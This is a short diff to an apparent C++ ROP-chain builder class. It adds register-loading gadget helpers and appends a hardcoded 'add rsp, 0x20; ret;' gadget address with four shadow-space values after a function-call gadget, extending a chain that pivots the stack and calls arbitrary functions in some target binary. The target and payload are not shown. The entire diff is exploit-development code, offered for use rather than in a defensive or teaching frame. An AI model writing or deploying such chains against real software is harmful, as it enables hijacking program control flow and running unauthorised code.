@@ -27,9 +27,11 @@ public:
     void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
     void AddPadding(const std::size_t PaddingSize = 8);
     void ReadIntoRcx(const std::uint64_t ReadAddress);
+    void ReadIntoR8(const std::uint64_t ReadAddress);
     void ReadRaxIntoRax();
     void PivotToR11();
     void MovRaxIntoR9();
+    void MovRaxIntoR8();
     void SetR8(const std::uint64_t NewR8Value);
     void SetR9(const std::uint64_t NewR9Value);
     void SetRdx(const std::uint64_t NewRdxValue);
@@ -68,5 +70,11 @@ public:
         this->AlignStack();
 
         this->AddGadget(FunctionAddress, "Function to call address");
+
+        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
+        this->AddValue(0, "Shadow space 1");
+        this->AddValue(0, "Shadow space 2");
+        this->AddValue(0, "Shadow space 3");
+        this->AddValue(0, "Shadow space 4");
     }
 };
